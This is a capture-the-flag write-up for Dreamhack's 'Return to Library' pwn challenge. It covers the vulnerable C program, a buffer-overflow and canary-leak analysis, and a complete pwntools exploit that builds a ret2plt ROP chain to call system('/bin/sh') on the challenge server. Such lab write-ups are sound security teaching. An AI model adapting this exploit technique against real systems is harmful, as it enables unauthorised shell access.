# Return to Library - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: rtl.c, rtl(ELF)
- tools: gdb(pwndbg)
## Brief Description
Exploit Tech: Return to Library에서 실습하는 문제입니다.
## Initial Analysis
### Environment
``` sh
checksec --file=rtl
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
### Code
``` c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```
### system("echo 'system@plt'");
ELF는 사용하는 함수에 대해서만 PLT에 등록한다. 어플 내부에서 `system`을 사용하기 때문에 PLT에 `system` 함수가 등록된다.  
## Vulnerability
### BOF(Buffer Overflow)
``` c
read(0, buf, 0x100);
```
`buf`의 크기는 0x30인 반면, `read`로 읽어오는 크기는 0x100이다. 이로인해 BOF 취약점이 발생하며 총 2번의 취약점이 발생한다.
### OOB(Out Of Bounds)
``` c
printf("Buf: %s\n", buf);
```
첫 번째 BOF 취약점 이후, `buf`를 출력한다. 만일 NULL-byte가 `buf` 내부에 없을 경우 OOB 취약점이 발생한다.  
## Exploit
### Strategy
두 번의 BOF를 통해 카나리 값을 읽고, Return to Libc 공격을 수행할 수 있다. 공격에 필요한 정보는 다음과 같다.  
| 정보 | 역할 | 확보 방법 |
| --- | --- | --- |
| system_PLT | system 호출 | pwndbg> plt |
| "/bin/sh" addr | system 함수 인자 | pwndbg> search /bin/sh |
| pop_rdi | system 인자를 레지스터에 전달 | ROPgadget --binary ./rtl --re "pop rdi" |
| ret | 스택 정렬 | ROPgadget --binary=./rtl \| grep ": ret" |

PIE가 비활성화 되어있어, 필요 정보 모두 위치가 고정된다.  
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | +0x8 |
| rbp |  |
| canary | -0x8 |
| dummy | -0x10 |
| buf | -0x40 |
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 18644)
context.arch = "amd64"

system_plt = 0x4005d0
binsh = 0x400874
pop_rdi = 0x0000000000400853
ret = 0x0000000000400596

# leak canary
leak_canary = b''
leak_canary += b'A' * 0x39 # to cover the canary NULL-byte, 0x38 + 0x1
p.sendafter(b'Buf: ', leak_canary)
p.recvuntil(leak_canary) # 내가 입력한 부분까지 받아옴
canary = u64(b'\x00' + p.recvn(7))
log.info(f'leaked canary: {canary}')

# exploit
payload = b''
payload += b'A' * 0x38 # buf + dummy
payload += p64(canary) # canary
payload += b'B' * 0x8 # rbp
payload += p64(ret) # align stack to prevent errors caused by movaps
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)
pause()
p.sendafter(b'Buf: ', payload)

# sh
p.interactive()
```

